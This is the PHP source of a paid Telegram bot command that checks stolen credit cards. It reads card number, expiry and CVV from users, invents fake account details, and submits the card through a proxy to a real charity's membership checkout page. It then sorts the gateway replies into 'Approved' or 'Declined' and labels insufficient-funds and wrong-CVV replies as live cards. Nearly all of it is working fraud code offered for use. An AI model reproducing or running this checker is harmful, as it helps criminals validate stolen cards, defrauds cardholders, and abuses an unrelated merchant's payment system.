<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}



if((strpos($text, '/auc') === 0) or (strpos($text, '.auc') === 0) or ((strpos($text, '$auc') === 0) or (strpos($text, '!auc') === 0)) or ((strpos($text, '+auc') === 0) or (strpos($text, '#auc') === 0)) or (strpos($text, '?auc') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Authorise Net 25$</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}

$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (strpos($paid, "User ID: $userId") === false) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>User is broke!</code>
[↯]Message: <code>Ever feel like your wallet is on a diet? My services are the guilt-free indulgence your finances deserve!!</code> 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
    return;
}

$spamResult = isSpamming($userId);
if ($spamResult !== false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamResult seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}  



//=========MAIN CODE===========//
$start_time = microtime(true);

$messageidtoedit50 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtopfw = capture(json_encode($messageidtoedit50), '"message_id":', ',');

  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0, 1);
$exploded = multiexplode(array(":", "/", " ", "|", ""), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $messageidtopfw,
        'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chkcc|mm|yy|cvv</code>-",
        'parse_mode' => 'html',
        'reply_to_message_id' => $messageidtopfw,
        'disable_web_page_preview' => true
    ]);
    return;
}

$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',

        ]);
return;
}

//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Authorise Net 25$
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  



  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#

//==================[Randomizing Details]======================//



//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Authorise Net 25$
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);

//==================[BIN LOOK-UP]======================//

//==================[BIN LOOK-UP-END]======================//
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];


 $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
 $bin1 = $fim["bin"] ?? null;

     if ($bin1 !== null) {
         $brand = $fim["brand"];
         $country = $fim["country"];
         $country_name = $fim["country_name"];
         $country_flag = $fim["country_flag"];

         $country_currencies = $fim["country_currencies"];
         $bank = $fim["bank"];
         $level = $fim["level"];
         $type = $fim["type"];
     }



//=======================[5 REQ]==================================//




bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Authorise Net 25$
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://transfamilies.org/es/membership-account/membership-checkout/?level=7');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: transfamilies.org',
    'method: POST',
    'path: /es/membership-account/membership-checkout/?level=7',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cnntent-Type: application/x-www-form-urlencoded',
    'origin: https://transfamilies.org',
    'referer: https://transfamilies.org/es/membership-account/membership-checkout/?level=7',
    'sec-Fetch-Dest: document',
    'sec-Fetch-Mode: navigate',
    'sec-Fetch-Site: same-origin',
    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    );


bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Authorise Net 25$
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);

//-------------------Req 2--------------//
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=3&checkjavascript=1&username='.$pass.'&password=abhyan3434&password2=abhyan3434&first_name='.$pass.'&last_name=noob&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname='.$pass.'&blastname='.$pass.'&baddress1=407&baddress2=&bcity=New+York&bstate=NY&bzipcode=10080&bcountry=GB&bphone=0+%28963%29+258-1470&CardType='.$card_type.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'&CVV='.$cvv.'&submit-checkout=1&javascriptok=1&trp-form-language=es');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Authorise Net 25$
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',

        ]);

//=============CHECKER PART END============//

if (
    strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
    strpos($result2, "Your card does not support this type of purchase.") !== false ||
    strpos($result2, 'transaction_not_allowed') !== false ||
    strpos($result2, "insufficient_funds") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Your card has insufficient funds.") !== false ||
    strpos($result2, '"status":"success"') !== false ||
    strpos($result2, "stripe_3ds2_fingerprint") !== false
) {

$es = ("Approved ✅");  
}

elseif (
  strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
  strpos($result2, "Your card does not support this type of purchase.") !== false ||
  strpos($result2, 'transaction_not_allowed') !== false ||
  strpos($result2, "insufficient_funds") !== false ||
  strpos($result2, "incorrect_zip") !== false ||
  strpos($result2, "Your card has insufficient funds.") !== false ||
  strpos($result2, '"status":"success"') !== false ||
  strpos($result2, "stripe_3ds2_fingerprint") !== false
) {
$es = ("Approved ✅");  

}
elseif (
    strpos($result2, 'security code is incorrect.') !== false ||
    strpos($result2, 'security code is invalid.') !== false ||
    strpos($result2, "Your card's security code is incorrect.") !== false
) {
$es = ("Approved ✅");  
}

elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
$es = ("Declined ❌");  

}
elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
$es = ("Declined ❌");  
}


else {
$es = ("Declined ❌");  
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//


bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtopfw,
'text'=>"<b>
Authorise Net 25$ 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: <code>$es</code>
[ϟ]Result: <code>$msg</code>

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]Time: <code>$time SEC</code> | IP: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'

            ]);
  recordBotResponseTimestamp($userId);



}
?>